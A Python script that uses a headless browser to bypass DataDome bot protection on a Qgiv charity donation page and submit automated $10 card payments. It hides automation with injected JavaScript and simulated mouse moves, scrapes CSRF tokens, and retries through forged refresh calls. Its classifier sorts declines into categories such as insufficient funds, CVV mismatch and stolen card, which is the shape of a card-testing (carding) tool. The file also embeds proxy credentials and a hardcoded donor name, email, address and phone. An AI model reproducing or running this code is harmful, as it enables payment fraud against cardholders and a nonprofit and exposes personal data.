#!/usr/bin/env python3
"""Zendriver DataDome solver + browser checkout."""
import asyncio, json, os, re, time
from datetime import datetime
from typing import Optional, Dict, Any
from urllib.parse import parse_qs, urlencode as url_enc
import zendriver as zd

PROXY_URL = os.environ.get("PROXY", "http://f449f4fbe7363deaf4eb:932a7acd4c6e38b8@74.81.81.81:823")
STEALTH = """Object.defineProperty(navigator,'webdriver',{get:()=>false});window.chrome={runtime:{}};"""

DECLINE = [(r"declined","declined"),(r"do\s+not\s+honor","declined"),
           (r"insufficient\s+funds","insufficient_funds"),(r"cvv\s+(?:mismatch|invalid|incorrect)","cvv_mismatch"),
           (r"card\s+(?:is\s+)?expired","expired"),(r"pick\s*up|stolen|restricted|fraud","pickup"),
           (r"invalid\s+(?:card\s+)?number","invalid"),(r"duplicate","duplicate"),
           (r"3[dD]\s*(?:secure|authentication)?\s*failed","3ds_failed"),
           (r"gateway\s+rejected|transaction\s+not\s+allowed","gateway_rejected")]

def classify_msg(msg):
    if not msg: return "failed"
    for p,s in DECLINE:
        if re.search(p, msg.lower()): return s
    return "failed"

class BrowserCapture:
    def __init__(self, proxy=None):
        self._proxy = proxy or PROXY_URL
        self._dd_posts = []

    def _handler(self, event):
        try:
            r = event.request
            if "api-js.datadome.co/js/" in r.url and r.method == "POST":
                p = parse_qs(r.post_data or "")
                self._dd_posts.append({"type": p.get("jsType",[""])[0]})
        except: pass

    async def harvest(self, target_url):
        self._dd_posts = []
        b = await zd.start(headless=True, browser_args=["--no-sandbox","--disable-dev-shm-usage"])
        t = await b.get(target_url, new_tab=True)
        t.add_handler(zd.cdp.network.RequestWillBeSent, self._handler)
        await t.send(zd.cdp.network.enable())
        await t.get(target_url); await t.evaluate(STEALTH); await t.sleep(5)
        for _ in range(10):
            if len(self._dd_posts) >= 2: break
            await t.sleep(1)
        await t.sleep(2)
        await t.get(f"{target_url}/embed"); await t.sleep(4)
        for _ in range(8):
            if len(self._dd_posts) >= 3: break
            await t.sleep(1)
        r = await t.send(zd.cdp.network.get_cookies())
        raw = r if isinstance(r, list) else r.get("cookies", r)
        cks = []
        for c in raw:
            n = c["name"] if isinstance(c,dict) else getattr(c,"name","")
            v = c["value"] if isinstance(c,dict) else getattr(c,"value","")
            d = c.get("domain",".qgiv.com") if isinstance(c,dict) else getattr(c,"domain",".qgiv.com")
            p = c.get("path","/") if isinstance(c,dict) else getattr(c,"path","/")
            e = c.get("expires",-1) if isinstance(c,dict) else getattr(c,"expires",-1)
            cks.append({"name":n,"value":v,"domain":d,"path":p,"expires":e if isinstance(e,(int,float)) else -1,"httpOnly":c.get("httpOnly",False) if isinstance(c,dict) else False,"secure":c.get("secure",True) if isinstance(c,dict) else True,"sameSite":"None"})
        sd = None
        try: sd = await t.evaluate("localStorage.getItem('SD_SID')")
        except: pass
        origins = []
        ls = []
        if sd: ls.append({"name":"SD_SID","value":sd})
        if ls: origins.append({"origin":"https://secure.qgiv.com","localStorage":ls})
        await b.stop()
        return {"cookies":cks,"origins":origins}

    async def checkout(self, target_url, card_number, card_mm, card_yy, card_cvv, captcha_token, donor, form_id="1128929"):
        b = None
        try:
            b = await zd.start(headless=True, browser_args=["--no-sandbox","--disable-dev-shm-usage"])
            t = await b.get(target_url, new_tab=True)
            self._dd_posts = []
            # DO NOT add handler — CDP network interception may break DD JS execution
            await t.evaluate(STEALTH)

            # Warm: main + embed with real mouse
            await t.get(target_url); await t.sleep(6)
            await t.sleep(2)
            print(f"  Page loaded")
            
            embed = f"{target_url}/embed"
            await t.get(embed); await t.sleep(2)
            for step in range(40):
                await t.mouse_move(200+(step*22)%1000, 150+(step*12)%500)
                await t.sleep(0.03)
            await t.scroll_down(3); await t.sleep(1); await t.scroll_up(2); await t.sleep(3)
            print(f"  Embed warmed")

            # CSRF
            csrf_url = f"https://secure.qgiv.com/api/v1/payment/paymentInitialState?formId={form_id}&viewName=paymentIframeQgivDonation"
            await t.get(csrf_url); await t.sleep(2)
            html = await t.get_content()
            csrf = re.search(r'<input[^>]*value="([^"]+)"[^>]*name="csrfToken"', html)
            csrf = csrf.group(1) if csrf else None
            if not csrf: await b.stop(); return {"status":"error","message":"CSRF"}
            print(f"  CSRF: {csrf[:20]}...")

            # Tokenize
            tok = url_enc({"Billing_Name":f"{donor['first_name']} {donor['last_name']}","Card_Number":card_number,"Card_Exp_Date":f"{card_mm}/{card_yy}","Card_CVV":card_cvv})
            tu = f"https://secure.qgiv.com/api/v1/payment/tokenizePayment?csrfToken={csrf}"
            tr, _ = await t.send(zd.cdp.runtime.evaluate(
                expression=f"(async()=>{{const f=document.createElement('iframe');f.style.display='none';document.body.appendChild(f);const cf=f.contentWindow.fetch.bind(f.contentWindow);const r=await cf('{tu}',{{method:'POST',headers:{{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'}},body:{json.dumps(tok)},credentials:'include'}});const j=await r.json();document.body.removeChild(f);return JSON.stringify({{t:j.token||'',e:j.error||j.ErrorMessage||'','s':r.status}});}})()",
                return_by_value=True, await_promise=True))
            trv = tr.value if hasattr(tr,'value') else tr
            print(f"  tok: {str(trv)[:200]}")
            try: tres = json.loads(trv) if isinstance(trv,str) else (trv or {})
            except: tres = {}
            token = tres.get("t") if isinstance(tres,dict) else None
            if tres.get("e"): await b.stop(); return {"status":classify_msg(tres["e"]),"message":tres["e"]}
            if not token: await b.stop(); return {"status":"error","message":"No token"}
            print(f"  Token: {token[:30]}...")

            # Refresh CSRF
            await t.get(csrf_url); await t.sleep(1)
            html2 = await t.get_content()
            csrf2 = re.search(r'<input[^>]*value="([^"]+)"[^>]*name="csrfToken"', html2)
            csrf = csrf2.group(1) if csrf2 else csrf

            # Submit via clean iframe fetch, with DD recovery on 403
            sub = url_enc({"form":form_id,"productType":"1","submissionType":"1",
                "Donations[0][Selected_One_Time_Id]":"1801508","Donations[0][Other_One_Time_Amount]":"10",
                "Donations[0][Recurring_Frequency]":"n",
                "Personal[First_Name]":donor["first_name"],"Personal[Last_Name]":donor["last_name"],
                "Personal[Email]":donor["email"],"Personal[Address]":donor.get("address",""),
                "Personal[City]":donor.get("city",""),"Personal[State]":donor.get("state",""),
                "Personal[Zip]":donor.get("zip",""),"Personal[Country]":donor.get("country",""),
                "Personal[Phone]":donor.get("phone",""),
                "Payment[Payment_Type]":"1","Payment[Card_Token]":token,
                "Billing[Billing_Country]":donor.get("country",""),
                "Billing[Billing_Address_Use_Mailing]":"true",
                "GiftAssist[donorIsCoveringFees]":"true","GiftAssist[feeCoverage]":"0.3",
                "G_Recaptcha_Response":captcha_token,
                "AbandonedGift[qgiv_abandoned_gift]":f"abandonedGiftDetails_{os.urandom(16).hex()}"})
            su = f"https://secure.qgiv.com/api/v1/submit?csrfToken={csrf}"
            
            sres = None
            for attempt in range(3):
                sr, _ = await t.send(zd.cdp.runtime.evaluate(
                    expression=f"(async()=>{{const f=document.createElement('iframe');f.style.display='none';document.body.appendChild(f);const cf=f.contentWindow.fetch.bind(f.contentWindow);const r=await cf('{su}',{{method:'POST',headers:{{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'}},body:{json.dumps(sub)},credentials:'include'}});const tx=await r.text();document.body.removeChild(f);return JSON.stringify({{s:r.status,b:tx}});}})()",
                    return_by_value=True, await_promise=True))
                srv = sr.value if hasattr(sr,'value') else sr
                try: sres = json.loads(srv) if isinstance(srv,str) else (srv or {})
                except: sres = {}
                print(f"  sub [{attempt}]: s={sres.get('s')}")
                
                if sres.get("s") != 403:
                    break
                
                # HAR flow: 403 → visit embed (DD JS fires CH refresh) → log_dd_refresh → retry
                await t.get(embed); await t.sleep(3)
                # Fire mouse to trigger LE
                for step in range(20):
                    await t.mouse_move(300+step*20, 200+step*10)
                    await t.sleep(0.02)
                await t.sleep(3)
                
                # Log DD refresh to Qgiv
                await t.evaluate(f"""
                    fetch('https://secure.qgiv.com/api/v1/internal/log_datadome_refresh?csrfToken={csrf}',{{
                        method:'POST', headers:{{'Content-Type':'application/x-www-form-urlencoded'}},
                        body:'entity={form_id}&entityType=8', credentials:'include'
                    }})
                """)
                await t.sleep(1)
                
                # Refresh CSRF
                await t.get(csrf_url); await t.sleep(1)
                html3 = await t.get_content()
                csrf3 = re.search(r'<input[^>]*value="([^"]+)"[^>]*name="csrfToken"', html3)
                csrf = csrf3.group(1) if csrf3 else csrf
                su = f"https://secure.qgiv.com/api/v1/submit?csrfToken={csrf}"
                
        except Exception as e:
            print(f"[checkout] {e}")
            if b: await b.stop()
            return {"status":"error","message":str(e)}

def harvest_session(target_url, output_dir=None, proxy=None):
    c = BrowserCapture(proxy=proxy)
    s = asyncio.run(c.harvest(target_url))
    if not s: return None
    if not output_dir: output_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),"sessions")
    os.makedirs(output_dir, exist_ok=True)
    ts = datetime.now().strftime("%H%M%S")
    idx = len([f for f in os.listdir(output_dir) if f.startswith("zd_")])
    fp = os.path.join(output_dir, f"zd_session_{idx:03d}_{ts}.json")
    with open(fp,"w") as f: json.dump(s,f,indent=2)
    return fp

def browser_checkout(card_number, card_mm, card_yy, card_cvv, captcha_token, donor=None, target_url="https://secure.qgiv.com/for/fromlegacytofuturethe40thcampaign", proxy=None):
    if donor is None: donor = {"first_name":"janina","last_name":"lange","email":"kirliadam21@gmail.com","address":"2302 Hilltop Haven Drive","city":"Teterboro","state":"New Jersey","zip":"07608","country":"US","phone":"9738193833"}
    return asyncio.run(BrowserCapture(proxy=proxy).checkout(target_url,card_number,card_mm,card_yy,card_cvv,captcha_token,donor))

if __name__ == "__main__":
    harvest_session("https://secure.qgiv.com/for/fromlegacytofuturethe40thcampaign")
